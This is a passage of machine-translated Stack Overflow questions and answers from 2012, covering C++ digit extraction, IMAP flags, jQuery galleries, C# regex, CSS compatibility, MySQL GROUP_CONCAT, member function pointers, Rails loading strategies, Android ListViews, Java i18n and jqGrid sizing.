*   在大多数 C++ 课程和教程中，它的细节经常被保留为（某种）痛苦

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-04-10T07:46:53.490

我已经实现了 giorashc 解决方案的一个变体，解决了所有建议的修复和问题：它有点长，但如果所有内容都内联，它应该会很快：大部分代码都是为了完整性而留下的测试。

```
#include <iostream>
#include <math.h>

char get_kth_digit( int v, int index)
{
  assert(v>0);
  int mask = pow(10,index);
  return '0'+(v % (mask*10))/mask;
}

int count_digits( int v )
{
  assert(v>0);

  int c=0;
  while(v>0)
  {
    ++c;
    v/=10;
  }

  return c;
}

char get_int_index(int v, int index)
{
  if( v==0 ) return '0';
  if( v <  0 )
  {
    if(index==0) { return '-'; }
    return get_int_index(-v,index-1);
  }

  // get_kth_digit counts the wrong way, so we need to reverse the count
  int digits = count_digits(v);
  return get_kth_digit( v, digits-index-1);
}

template<typename X, typename Y>
void compare(const X & v1, const Y & v2, const char * v1t, const char * v2t, uint32_t line, const char * fname )
{
  if(v1!=v2)
  {
    std::cerr<<fname<<":"<<line<<": Equality test failed "<< v1t  << "("<<v1<<") <> " << v2t <<" ("<<v2<<")"<<std::endl;
  }
}

#define test_eq(X,Y) compare(X,Y,#X,#Y,__LINE__,__FILE__)

int main()
{
  test_eq( 1, count_digits(1) );
  test_eq( 1, count_digits(9) );
  test_eq( 2, count_digits(10) );
  test_eq( 2, count_digits(99) );
  test_eq( 3, count_digits(100) );
  test_eq( 3, count_digits(999) );

  test_eq( '1', get_kth_digit(123,2) );
  test_eq( '2', get_kth_digit(123,1) );
  test_eq( '3', get_kth_digit(123,0) );

  test_eq( '0', get_kth_digit(10,0) );
  test_eq( '1', get_kth_digit(10,1) );

  test_eq( '1', get_int_index(123,0) );
  test_eq( '2', get_int_index(123,1) );
  test_eq( '3', get_int_index(123,2) );

  test_eq( '-', get_int_index(-123,0) );
  test_eq( '1', get_int_index(-123,1) );
  test_eq( '2', get_int_index(-123,2) );
  test_eq( '3', get_int_index(-123,3) );

} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2019-07-31T00:44:57.457

我会将其转换为字符串，然后对其进行索引——CPP 还具有：

```
str.at(i) 
```

功能类似于 Java 的。

C++11 中另一个更简单的循环是基于范围的循环——

```
int i = 0
for(auto s : int_or_str){
    if(i == idx)
        cout << s;
    else
        i++  
} 
```

我想这并不比标准 for 循环容易——认为 auto 可能有帮助，不是真的。我知道这是有答案的，但我更喜欢简单而熟悉的答案。

扎克*

# objective-c - 如何使用objective c在IMAP中将已读邮件标记为未读

> ID：10084343
> 
> 赞同：1
> 
> 时间：2012-04-10T06:52:32.073
> 
> 标签：objective-c, cocoa, imap

我试图在单击未读按钮时将已读邮件标记为未读。**邮件被标记为未读，但再次登录时，邮件显示为已读**。这是我正在使用的代码的一部分：-

```
-(IBAction)markAsUnreadButtonAction:(id)sender{
    actionFlag = MailActionUnread;
    if(imapMessage){
        [[imapMessage flags] remove:PantomimeSeen];
        [mailListTable deselectAll:nil];
        [self setEmptyFieldsOnMailWindow];
        [currentImapFolder setFlags:[imapMessage flags] messages:[NSArray arrayWithObject:imapMessage]];
        int selectedRow = [mailListTable selectedRow];
        NSLog(@"");
        if(selectedRow >= 0){
            NSMutableDictionary *tempDic = [[NSMutableDictionary alloc] initWithDictionary:[mailListArray objectAtIndex:selectedRow]];
            [tempDic setObject:@"0" forKey:@"seen"];
            [mailListArray replaceObjectAtIndex:selectedRow withObject:tempDic];
            [tempDic release];
            [mailListTable reloadData];
            [unreadMailsCountDict setObject:[NSString stringWithFormat:@"%d",[[imapStore selectedFolder] numberOfUnreadMessages]] forKey:[[imapStore selectedFolder] name]];
            [totalMailsCountDict setObject:[NSString stringWithFormat:@"%d",[[imapStore selectedFolder] numberOfUnreadMessages]] forKey:[[imapStore selectedFolder] name]];
            [mailBoxesListTable reloadData];
        }
    }

} 
```

请告知应该怎么做才能在再次登录时将未读邮件显示为未读。

# image - 为 fancybox 图片库生成锚点和图片标签

> ID：10084345
> 
> 赞同：0
> 
> 时间：2012-04-10T06:52:40.127
> 
> 标签：image, tags, fancybox, code-generation, anchor

我有一个简单的 html 页面，我想用fancybox 为它制作一个非常简单的画廊。这是一张图片的代码：

```
<a class="gallery" href="img/83.jpg"><img src="img/83k.jpg" alt="" /></a> 
```

问题是，我有 400 个，我必须让它连续，比如：

```
<a class="gallery" href="img/84.jpg"><img src="img/84k.jpg" alt="" /></a>
<a class="gallery" href="img/85.jpg"><img src="img/85k.jpg" alt="" /></a>
etc... 
```

手工编码会很痛苦。我怎样才能生成所有这些？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T17:13:26.183

创建一个要在其中生成画廊的容器，例如：

```
<div id="galleries"></div> 
```

然后使用此代码：

```
$(document).ready(function(){
 var i = 83; // select your initial number
 for (i=83; i<=483; i++){ // loop as many images as you need
  $("div#galleries").append('<a href="img/' + i + '.jpg" class="fancybox" rel="gallery"><img src="img/' + i + 'k.jpg" alt="" /></a>');
 } // for
// and set your fancybox script afterwards
 $('.fancybox').fancybox({
  // fancybox options
 }); // fancybox
}); //ready 
```

# c# - 使用正则表达式获取html标签的变量值

> ID：10084346
> 
> 赞同：3
> 
> 时间：2012-04-10T06:52:40.437
> 
> 标签：c#, html-parsing

我试图在 html 的某些文本之间获取一个值，到目前为止还没有成功，我不能使用 html agility pack，因为它提供的数据只存在于 html 标签之间

```
public static string[] split_comments(string html)
    {
        html = html.ToLower();

        html = html.Replace(@""""," "); 
```

html 中的实际行是这样的

//`<meta itemprop="rating" content="4.7"> the 4.7 value changes every time and I need to get this value`

```
Match match = Regex.Match(html, @"<meta itemprop=rating content=([A-Za-z0-9\-]+)\>$");
            if (match.Success)
            {
                // Finally, we get the Group value and display it.
                string key = match.Groups[1].Value;
            } 
```

所以我正在尝试获取一个 html 标记，并且在该标记中我希望获取始终可变的数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T07:17:41.233

```
string html = "<meta itemprop=\"rating\" content=\"4.7\">";
HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
doc.LoadHtml(html);
var content = doc.DocumentNode
                .Element("meta")
                .Attributes["content"].Value; 
```

**- 编辑 -**

从你第一次接受然后不接受答案，我*猜*你拿了代码并用你的真实 html 运行，发现它返回了错误的结果。

这并不表明答案不正确，因为它与您发布的代码段一起正常工作。

`meta`因此，通过大胆猜测并假设您的真实 html中还有其他标签，其`itemprop`属性如下

```
<meta itemprop="rating" content="4.7">
<meta itemprop="somekey" content="somevalue"> 
```

代码是：

```
var content = doc.DocumentNode
                .Descendants("meta")
                .Where(n => n.Attributes["itemprop"] != null && n.Attributes["itemprop"].Value == "rating")
                .Select(n => n.Attributes["content"].Value)
                .First(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:16:02.783

首先，您应该替换它：

```
html = html.Replace(@""""," "); 
```

接着就，随即：

```
html = html.Replace(@"""",""); 
```

并更改您的正则表达式：

```
Match match = Regex.Match(html, @"<meta itemprop=rating content=([A-Za-z0-9\-.]+)\>$"); 
```

否则你的 if 将永远是假的。之后，您可以简单地使用子字符串：

```
 html = html.Substring(html.IndexOf("content=") + 8);

 html = html.Substring(0, html.Length - 1); 
```

我希望这会有所帮助

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:06:17.530

这里

```
html = html.Replace(@""""," "); 
```

你用空格替换双引号。因此，您的示例字符串现在如下所示：

```
<meta itemprop= rating  content= 4.7 > 
```

但是，您的正则表达式匹配没有这些额外空格的文本。此外，您的正则表达式在关闭之前需要一个反斜杠`>`，这在示例中不存在。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-10T07:08:16.157

您的正则表达式应该类似于`@"\<meta.+?content\=\"(.+)\"\>"`. 虽然用正则表达式解析 HTLM 是一件坏事。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T07:28:00.450

试试这个：

```
 double searchedValue;
        Regex reg = new Regex(@"content= (?<groupname>.*?) >");
        var matches = reg.Match(@"<meta itemprop= rating  content= 4.7 >");
        var value = matches.Groups["groupname"].Value;
        //maybe you need to replace like value.Replace('.',',')
        double.TryParse(value , out searchedValue); 
```

`(?<groupname> ... )`成立一个小组。您可以使用`matches.Groups["groupname"].Value`

`.*?` 正在阅读“”的下一场比赛`>`。

如果您不使用“ `?`”，它将`>`在您的文本中搜索“”的最后一个匹配项。

祝你好运=)

# html - 如何修复属性溢出-y 在 CSS 级别 2.1 中不存在？

> ID：10084348
> 
> 赞同：1
> 
> 时间：2012-04-10T06:52:42.290
> 
> 标签：html, xhtml, css, css-validator

如何修复以下 CSS 错误？

> 属性 overflow-y 在 CSS 级别 2.1 中不存在，但存在于 [css3] 中：滚动

可以换吗

```
html {  overflow-y: scroll; } 
```

和

```
html{   overflow: scroll; } 
```

验证代码： http: [//jigsaw.w3.org/css-validator/validator ?uri=http%3A%2F%2Fwww.santiagomichalek.com%2Fmanage.php&profile=css21&usermedium=all&warning=1&vextwarning=&lang=en](http://jigsaw.w3.org/css-validator/validator?uri=http%3A%2F%2Fwww.santiagomichalek.com%2Fmanage.php&profile=css21&usermedium=all&warning=1&vextwarning=&lang=en)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T06:56:28.173

不。正如错误消息所说，`overflow-y`( 和`overflow-x`) 在 3 之前的 CSS 规范中不存在。CSS 2.1 只有`overflow`，它会影响两个轴，所以`* { overflow-y: scroll; }`会给你同样的错误。

**编辑**在问题编辑之后：后一个选项将起作用，但也会影响 X 轴，因此也会强制执行水平滚动条。

# html - 用于 IE8 的弯曲边框 CSS

> ID：10084349
> 
> 赞同：0
> 
> 时间：2012-04-10T06:52:50.107
> 
> 标签：html, css, javascript, css3pie

我需要 IE8 和所有主要浏览器的弯曲边框 CSS。目前我正在尝试使用[CSS PIE](http://css3pie.com/documentation/)

jsfiddle 演示在[这里](http://jsfiddle.net/bDvRd/3/)。[但我建议回答者在此处](http://css3pie.com/download-latest)下载 PIE.htc 文件表单并尝试将 HTML 作为独立页面在 IE8 中获得真正的效果。

我的问题是`<td>`包含“感谢您注册”的文本在 jsfiddle 的 IE8 中没有弯曲。如果我将它作为 HTML 页面运行，它在 IE8 中是弯曲的，但蓝色背景与“感谢您注册”重叠`<td>`（但它的背景是“#f2f2f2”）。

```
 <table cellpadding="0" cellspacing="0" border="0" width="100%" style="margin:0px; padding:0px;">
        <tr>
            <td>&nbsp;</td>
            <td style="width: 60%; text-align: center;background: #0067C8;">
                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                    <tr>
                        <td colspan="3" style="height: 50px; background-color: #262626; width:100%; text-align: left;">
                            <img src="twitter_logo.png" width="200" height="50" alt"Twitter" />
                        </td>
                    </tr>
                    <tr>
                        <td colspan="3" style="height: 25px;">&nbsp;</td>
                    </tr>
                    <tr>
                        <td style="width:3%;">&nbsp;</td>
                        <td style="width: 94%; background-color: #f2f2f2; height: 400px; font-family: arial; font-size: 30px; color: #2DB8ED; text-align: center; border: 2px solid #bcbcbc;text-align: center;-webkit-border-radius: 10px;-moz-border-radius: 10px;border-radius: 10px; behavior: url(PIE.htc);">
                            Thank you for registering
                        </td>
                        <td style="width:3%;">&nbsp;</td>
                    </tr>
                    <tr>
                        <td colspan="3" style="height: 25px;">&nbsp;</td>
                    </tr>
                </table>
            </td>
            <td>&nbsp;</td>
        </tr>
    </table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:17:24.763

您是否尝试过[http://jquery.malsup.com/corner/](http://jquery.malsup.com/corner/) jquery 插件来添加曲线？

```
$(function () {
   $('table table tr:eq(2) td:eq(1)').corner();
}); 
```

演示：http: [//jsfiddle.net/bDvRd/4/](http://jsfiddle.net/bDvRd/4/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:30:52.583

我认为这主要是因为 z-index 的问题。

在这里查看更多详情。[使用 PIE 时遇到的一般问题](http://css3pie.com/documentation/known-issues/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:44:37.517

尝试添加

```
position:relative;
z-index: 0; 
```

通过[在 IE8 中使用 CSS3Pie htc 作为边框半径](https://stackoverflow.com/questions/4326363/using-css3pie-htc-for-border-radius-in-ie8)

或[CSS3 PIE - 提供 IE 边框半径支持不起作用？](https://stackoverflow.com/questions/3522145/css3-pie-giving-ie-border-radius-support-not-working/)

# mysql - 向 mySQL GROUP_CONCAT 语句添加内连接

> ID：10084352
> 
> 赞同：7
> 
> 时间：2012-04-10T06:53:21.373
> 
> 标签：mysql, group-concat

**问题：**我有一个按预期工作的 GROUP_CONCAT 查询，除了我想让 concat 成为连接答案，而不是原始 ID 字段。

**当前查询：**

```
SELECT user.user_id, user.user, GROUP_CONCAT(user_roles.roleID separator ', ') roles
FROM user
JOIN user_roles ON user.user_ID = user_roles.user_ID
GROUP BY users.user_ID, users.user 
```

**给出结果：**

```
+----------+---------+----------------------------+
|  user_ID | user    |   roles                    |
+----------+---------+----------------------------+
|        1 |   Smith |    1, 3                    |
+----------+---------+----------------------------+
|        2 |   Jones |    1, 2, 3                 |
+----------+---------+----------------------------+ 
```

**期望的结果：**

```
+----------+---------+----------------------------+
|  user_ID | user    |   roles                    |
+----------+---------+----------------------------+
|        1 |   Smith |    Admin, Other            |
+----------+---------+----------------------------+
|        2 |   Jones |    Admin, Staff, Other     |
+----------+---------+----------------------------+ 
```

*用户表：*

```
+----------+---------+
|  user_ID | user    |
+----------+---------+
|        1 |   Smith |
+----------+---------+
|        2 |   Jones |
+----------+---------+ 
```

*users_roles 表：*

```
+----------+---------+
|  user_ID | role_ID |
+----------+---------+
|        1 |   1     |
+----------+---------+
|        2 |   1     |
+----------+---------+
|        2 |   2     |
+----------+---------+
|        2 |   3     |
+----------+---------+
|        1 |   3     |
+----------+---------+ 
```

*角色表：*

```
+----------+-----------+
|  role_ID | role_name |
+----------+-----------+
|        1 |   Admin   |
+----------+-----------+
|        2 |   Staff   |
+----------+-----------+
|        3 |   Other   |
+----------+-----------+ 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-10T06:56:16.283

尝试以下查询

```
SELECT user.user_id, user.user, GROUP_CONCAT(roles.role_name  separator ', ') roles
FROM user
JOIN user_roles ON user.user_ID = user_roles.user_ID
JOIN roles ON user_roles.role_ID= user_roles.role_ID
GROUP BY users.user_ID, users.user 
```

# c++ - C++ 函数指针转换

> ID：10084354
> 
> 赞同：1
> 
> 时间：2012-04-10T06:53:41.173
> 
> 标签：c++, function-pointers

我现在正在用 C++ 为数据结构类开发一个模板化的二叉搜索树。到目前为止，一切都进展顺利。这个问题涉及一些我不熟悉的细节 C++ 东西，我需要帮助。

我之前定义了遍历树并以不同顺序访问每个节点的函数。这里所讨论的定义如下。

树节点.h

```
public:
  static void PostOrderVisit(TreeNode<T>* node, void visit(const T& v)); 
```

树节点.cpp

```
template <class T> void TreeNode<T>::PostOrderVisit(TreeNode* node, void visit(const T& v)) {
  if (node->leftChild != NULL)
    PostOrderVisit(node->leftChild, visit);
  if (node->rightChild != NULL)
    PostOrderVisit(node->rightChild, visit);
  visit(node->value);
} 
```

这在制作节点并静态调用 PostOrderVisit 的测试程序中运行良好。

在一个朋友类（BinSTree.h/cpp）中，我正在实现一个删除树中每个节点的方法，所以我认为使用这个访问者并在每个节点上调用我的 Delete() 函数是个好主意（ Delete() 函数在 BinSTree 的测试程序中也可以正常工作）。

该函数定义如下。

```
template <class T> void BinSTree<T>::ClearTree() {
  TreeNode<T>::PostOrderVisit(this->root(), &BinSTree<T>::Delete);
} 
```

这就是问题所在。g++ 说……

```
BinSTree.cpp:156: error: no matching function for call to ‘TreeNode<int>::PostOrderVisit(TreeNode<int>*, void (BinSTree<int>::*)(const int&))’
TreeNode.cpp:56: note: candidates are: static void TreeNode<T>::PostOrderVisit(TreeNode<T>*, void (*)(const T&)) [with T = int] 
```

在这种情况下，我认为那`void (BinSTree<T>::*)(const T&)`将是 的一个实例`void (*)(const T&)`，但事实并非如此。我可以让函数定义识别调用的唯一方法是像这样转换函数指针：

```
TreeNode<T>::PostOrderVisit(this->root(), (void (*)(const T& v)) &BinSTree<T>::Delete); 
```

这可以识别函数并适当地调用它，但是（这需要进行一些重要的研究......），C++ 成员函数有一个隐式参数，允许从内部访问“this”关键字。将成员函数指针转换为普通函数指针会完全删除“this”引用，导致我的 Delete() 方法出现段错误（它使用了很多“this”）。

这太麻烦了，我花了很多时间在这个项目的一小部分上。谁能告诉我一种方法：A：在没有强制转换的情况下识别函数，或者 B：如何在整个强制转换中保持“this”引用。ClearTree() 和 Delete() 方法都在同一个类中。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:02:27.933

首先，`PostOrderVisit`应该将函数参数作为指针，即`PostOrderVisit(TreeNode<T>* node, void (*visit)(const T& v))`.

但是，这不会解决您的问题，因为您正在向它传递一个非静态成员函数。您传递给它的函数必须`static`在类中，或者您可以使用类似的东西[`std::function`](http://en.cppreference.com/w/cpp/utility/functional/function)而不是函数指针参数，即`PostOrderVisit(TreeNode<T>* node, std::function<void(const T&)> visit)`.

**编辑** 在那种情况下，我认为你有两种方法可以做到这一点：一种是改变你的设计以适应参数，这意味着你不能使用成员方法作为参数。二是修改代码以适应你的设计，向老师解释由于它的限制你必须改变界面，并解释那些限制。

使用普通函数指针作为参数的问题在于，成员函数`this`对于类的实例有一个隐式和隐藏的参数 。普通函数没有这个隐藏参数，所以编译器禁止你使用成员函数。解决方案是使用普通函数，这不是很 C++-ish，另一种是使用`static`成员函数（因为它们没有`this`指针），或者使用类似`std::function`.

至于如何使用`std::function`，你在`PostOrderVisit`我展示的声明和定义中使用它。当您调用它时，您会执行以下操作：

```
template <class T> void BinSTree<T>::ClearTree() {
    TreeNode<T>::PostOrderVisit(this->root(), std::mem_fn(&BinSTree<T>::Delete));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:31:01.213

非静态方法采用“this”的隐式参数。例如对于一个方法 C::f(int i)，你可以把它想象成 f(C* this, int i)。你所做的任何铸造并搞砸了这个签名，你都可以预料到坏事会发生。您已经经历过崩溃，但更险恶的伪影可能会使程序行为异常或在其他看似随机的地方崩溃。

您可以像这样使用指向成员函数的指针：

在.h

```
template <class C>
static void PostOrderVisit(C* node, void (C::* visit)(const T& v)); 
```

在 .cpp 中（实际上，如果它是一个模板，它必须全部在 h 中，否则链接错误）

```
template <class T>
template <class C>
void TreeNode<T>::PostOrderVisit(C* node, void (C::* visit)(const T& v))
{
    // ...
    T value;
    (node->*visit)(value);
    // ...
} 
```

您可以将指针传递给派生类（如此处的 C）或指向基类的指针（如原始的 TreeNode）。在某些时候，您可能需要投射。

当您将普通函数作为访问者传递时，您也可以保留原始函数。函数重载会引起注意。

更通用的方法是使用 std::function。尽管它可能会对性能造成一些轻微的影响，但它是最通用的。

例如（未编译可能有一些小的语法错误）：

```
static void PostOrderVisit(TreeNode<T>* node, std::function<void (const T& v)> visit); 
```

在 PostOrderVisit 中，您只需执行访问（值），例如像普通函数一样调用。

当您调用 PostOrderVisit 时，您可以使用 std::bind 或 boost::bind 的所有功能来携带尽可能多的额外信息。例如

PostOrderVisit(this->root(), std::bind(&BinSTree::Delete, this));

# ruby-on-rails - Rails 中的急切加载和延迟加载

> ID：10084355
> 
> 赞同：35
> 
> 时间：2012-04-10T06:53:45.040
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我对急切加载和延迟加载感到困惑，rails 查询的性能有什么不同吗？

有没有办法实现这两种方式？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-04-10T07:34:08.590

[**急切加载**](http://railscasts.com/episodes/22-eager-loading)

提高性能的一种方法是减少 SQL 查询的数量。您可以通过预先加载来做到这一点。

```
User.find(:all, :include => :friends) 
```

在这里，您只触发了两个查询：

1) 一个适用于所有用户。

2) 一个给所有用户的朋友。

[**延迟加载**](http://weblogs.asp.net/fbouma/archive/2007/04/16/more-on-lazy-loading-vs-pre-loading-in-o-r-mapping-scenarios.aspx)：

当您有一个与许多对象相关联的对象时，例如用户有很多朋友，并且您希望像在 Orkut 中一样显示一个列表，您会触发与朋友一样多的查询，再加上一个针对对象本身的查询。

```
users = User.find(:all) 
```

然后查询每个用户朋友，例如：

```
users.each do |user|
  friend = Friend.find_by_user_id(user.id)
end 
```

这里

1) 一次查询所有用户。

2）N查询N号。的用户朋友。

看看：[Rails 3：延迟加载与急切加载](https://stackoverflow.com/questions/3975149/rails-3-lazy-loading-versus-eager-loading)

希望这能帮助您理解这一点。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2016-06-08T11:43:43.763

**渴望加载**

临：是一切准备就绪。

缺点：您正在用完空间/内存。

**延迟加载**

一个轶事可能会帮助您记住：

```
A young naval cadet asked Lord Nelson why he wasn't preparing his ships: 
```

> “我不会提前装弹……我会在需要开火前 1 微秒装弹。” 他说。“我很懒惰。我更喜欢在最后一刻才这样做，就像我的大学作业等一样。”

延迟加载的优点：除非需要，否则不会访问数据库。

缺点：您将访问数据库 N + 1 次.....除非您准确选择所需的列并为其设置别名。例如

```
@products = Product.order("categories.name").joins(:category) 
```

**使用延迟加载策略仅访问数据库一次：**

当您`product.category.name`在视图模板中调用时，上述查询会命中数据库 N + 1 次 - 其中 product 是关系中的单个对象`@products`。但是如果你给它起别名，你可以通过一个查询来完成所有的事情：

```
@products = Product.order("categories.name").joins(:category).select("products.*, categories.name as category_name") 
```

并像这样使用它：product.category_name

# android - 如何从android中的mysql数据库获取自定义listview editext中editext的所有值

> ID：10084360
> 
> 赞同：0
> 
> 时间：2012-04-10T06:54:39.187
> 
> 标签：android, android-listview

我正在从 mysql 数据库中获取菜单名称，并使用基本适配器附加到自定义列表视图中的 edittext。现在我正在更改 editext 值中的一些菜单名称。现在我想从头到尾获取所有编辑文本

```
 Eg:x,y,z,.... are menunames coming from database it append editext(cusom listview)
            i am change editext value y to b
            now i want x,b,z...... values in arraylisst.. 
```

我的基本适配器类

```
public class EditMainMenulistview extends BaseAdapter {
    public final ArrayList<String> arr = new ArrayList<String>();
    protected static Context Context = null;
    int i;
    public String editnewmainmenu, menuname, edittext;
    String qrimage;
    Bitmap bmp, resizedbitmap;
    Bitmap[] bmps;
    Activity activity = null;
    private LayoutInflater inflater;

    private ImageView[] mImages;
    String[] itemimage;
    TextView[] tv;
    String itemname, itemcode;
    public String[] itemnames, itemcodes;
    HashMap<String, String> map = new HashMap<String, String>();

    public EditMainMenulistview(Context context, JSONArray imageArrayJson) {
        Context = context;
        // inflater =
        // (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        // imageLoader=new ImageLoader(activity);
        inflater = LayoutInflater.from(context);
        this.mImages = new ImageView[imageArrayJson.length()];
        this.bmps = new Bitmap[imageArrayJson.length()];
        this.itemnames = new String[imageArrayJson.length()];
        this.itemcodes = new String[imageArrayJson.length()];

        try {

            for (i = 0; i < imageArrayJson.length(); i++) {
                JSONObject image = imageArrayJson.getJSONObject(i);
                qrimage = image.getString("menuimage");
                itemname = image.getString("menuname");
                itemcode = image.getString("menucode");
                itemnames[i] = itemname;
                itemcodes[i] = itemcode;

                byte[] qrimageBytes = Base64.decode(qrimage.getBytes());

                bmp = BitmapFactory.decodeByteArray(qrimageBytes, 0,
                        qrimageBytes.length);
                int width = 100;
                int height = 100;
                resizedbitmap = Bitmap.createScaledBitmap(bmp, width, height,
                        true);
                bmps[i] = bmp;

                mImages[i] = new ImageView(context);
                mImages[i].setImageBitmap(resizedbitmap);

                mImages[i].setScaleType(ImageView.ScaleType.FIT_START);

                // tv[i].setText(itemname);
            }
            System.out.println(itemnames[i]);

        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    public int getCount() {
        return mImages.length;
    }

    public Object getItem(int position) {
        return position;
    }

    public long getItemId(int position) {
        return position;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        final ViewHolder holder;

        if (convertView == null) {
            holder = new ViewHolder();
            convertView = inflater.inflate(R.layout.editmainmenulist, null);
            holder.caption = (EditText) convertView
                    .findViewById(R.id.editmaimenu);
            holder.caption1 = (ImageView) convertView
                    .findViewById(R.id.menuimage);
            convertView.setTag(holder);
        } else {
            holder = (ViewHolder) convertView.getTag();
        }
        // Fill EditText with the value you have in data source
        holder.caption.setText(itemnames[position]);//i append menunames here
        holder.caption.setId(position);
        holder.caption1.setImageBitmap(bmps[position]);

        // we need to update adapter once we finish with editing
        arr.add(holder.caption.getText().toString());//here i am try to get all values change and without edit text values but it get only menunames values

        return convertView;
    }
}

class ViewHolder {
    EditText caption;
    ImageView caption1;
}

class ListItem {
    String caption;
} 
```

请帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:15:01.880

我认为您将需要使用`OnTouch`for`EditText`来获取它的 ID 并添加`TextWatcher`以在该 EditText 中获取 Editext。

这是 EditText 中 Touch Listener 的示例

```
OnTouchListener mEdittextTouchListener = new OnTouchListener() {

    @Override
    public boolean onTouch(View v, MotionEvent event) {

        int childPosition =  v.getId;
        Log.i("Log_tag", "Edittext Position is " + childPosition);
                   //Here you will get your EditText Position.
        //saveData=true;
        //setChildPosition(childPosition);

        return false;
    }
}; 
```

现在`TextWatcher`在您的 Activity 中实现并在您的 .getView 中添加这样的修改`BaseAdapter`。

```
 holder.caption.removeTextChangedListener(ExpandableListPage.this);
 holder.caption.setOnTouchListener(mEdittextTouchListener);
 holder.caption.addTextChangedListener(ExpandableListPage.this); 
```

现在确保首先从 EditText 中删除 TextWatcher 并添加它。因为当您的列表视图视图要显示时 EditText 将调用 TextWather 方法，为了防止这种情况我们总是需要删除它然后添加它。

```
 @Override
public void afterTextChanged(Editable s) {
    Log.v("Log_tag", "After TextChanged" + s.toString());

}

@Override
public void beforeTextChanged(CharSequence s, int start, int count,
        int after) {
    Log.i("Log_tag", "Before TextChanged" + s.toString());

}

@Override
public void onTextChanged(CharSequence s, int start, int before, int count) {
    Log.e("Log_tag", "ontext Changed"+ s.toString());
    if(count!=0){
        if(saveData){
            //Add your EditText Change Value here 
                           arr.add(s.toString());
            }
        }

    }

} 
```

# java - Java 国际化 (i18n) 库/框架

> ID：10084365
> 
> 赞同：19
> 
> 时间：2012-04-10T06:55:05.540
> 
> 标签：java, jakarta-ee, internationalization

我的组织即将开始漫长的国际化（i16g？）其公司网站的过程。该网站混合了 Java EE（JSP/Servlets，无 EJB）和从（Documentum）WCM 推送的静态内容。

虽然我有使用 's 的“内置”机制`ResourceBundle`以及每种语言/区域设置的关联属性文件（包含“KEY = Translated value”方法）的经验，但我们只需在我们想要的地方引用 KEY 值出现的翻译文本。

我的主管提到他在以前的组织中使用了一种不同的方法，他们使用了第 3 方库（他不记得实际名称），其中包括网页中的实际 [英文] 文本（以帮助开发人员）在运行时替换为配置 xml 文件中的翻译内容。*（有人知道这会是哪个图书馆吗？）*

我对可能有哪些其他方法/库/框架来促进这一点感兴趣。

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-10T08:40:13.103

你的老板可能是指[gettext](http://code.google.com/p/gettext-commons/)，就像@Pawel Dyda 提到的那样，但你也可能对[cosmopolitan感兴趣。](https://github.com/rodionmoiseev/c10n/wiki/Overview)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-02-01T19:18:54.800

我的公司还为 Java 维护了一个与 GNU gettext 相关的库（很快就会有针对 Scala 的扩展）。

它不仅支持 GNU gettext 的所有优点，还简化了日期/时间戳和货币的输出和输入，包括在翻译中使用“wiki”格式的工具（例如，您可以在单词上输出 HTML 粗体） ，java消息格式，通用的“转义”支持（因此输出可以自动转义以包含在HTML中）和货币四舍五入。

它是开源的，目前在 github 上[https://github.com/awkay/easy-i18n/](https://github.com/awkay/easy-i18n/)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-10T07:41:53.207

当我听说你在使用`ResourceBundle`s 时，我看到如下内容：

```
ResourceBundle rb = ResourceBundle.getBundle("messages", locale);
String someString = rb.getString("some.key"); 
```

如果这是您的 Java 服务器页面方法（在 scriplets 中使用此类片段），这是***错误***的。相反，您应该使用 JSTL 或 Spring 消息标签。

至于您的询问，我相信他们使用了 Gettext（抱歉没有链接，因为我的时间不多了）。这不是最好的方法。JSTL 方法是 JSP 最常见的方法，您应该坚持使用它，除非您有充分的理由不这样做。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-05T19:01:49.783

值得一看[http://alexsexton.com/blog/2012/03/the-ux-of-language/](http://alexsexton.com/blog/2012/03/the-ux-of-language/)它很好地解释了 gettext 背后的想法和 gettext 设计的局限性 gettext 的更好方法是ICU 消息格式这是 JDK MessageFormat 类所基于的，在[http://site.icu-project.org/home](http://site.icu-project.org/home)上还有一个基于 ICU 消息格式的 javascript 库[https://github.com/SlexAxton/messageformat .js](https://github.com/SlexAxton/messageformat.js)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-07-01T07:55:16.543

我希望，现在建议另一种解决方案还为时不晚：[https ://github.com/resource4j/resource4j](https://github.com/resource4j/resource4j)

该库与 Thymeleaf 网页渲染器集成，解决了您提到的问题：您在页面模板中包含英文文本，然后在运行时将其替换为本地化版本。

# jquery - 动态修复jqgrid高度

> ID：10084371
> 
> 赞同：1
> 
> 时间：2012-04-10T06:55:19.393
> 
> 标签：jquery, jqgrid

我们可以像这样使用struts2标签设置jqgrid高度

```
 <sjg:grid 
        .
        .
        .
        .
    height="500px"
        .
        .
        .
         > 
```

我需要通过计算窗口大小来动态设置高度。我试过这样

```
 var  height=window.innerHeight;
        $('#gridId').jqGrid('setGridHeight',height); 
```

